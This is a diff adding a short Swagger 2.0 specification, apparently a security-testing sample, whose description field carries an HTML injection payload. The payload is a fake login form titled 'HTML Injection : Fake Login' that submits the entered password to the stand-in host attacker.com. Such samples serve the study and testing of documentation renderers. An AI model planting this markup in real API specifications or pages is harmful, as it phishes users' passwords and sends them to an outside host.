@@ -1,0 +1,18 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Fake Login Page
+  description: '<div class="login-form">
+    <div class="heading">
+        <h1>HTML Injection : Fake Login</h1>
+    </div>
+    <div class="form-container">
+     <form action="https://attacker.com?password=">Enter password to Proceed: <input name="password" type="text" value="" > <br /><br /> <input type="submit" value="Submit" /></form>
+    </div>
+</div>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successfula
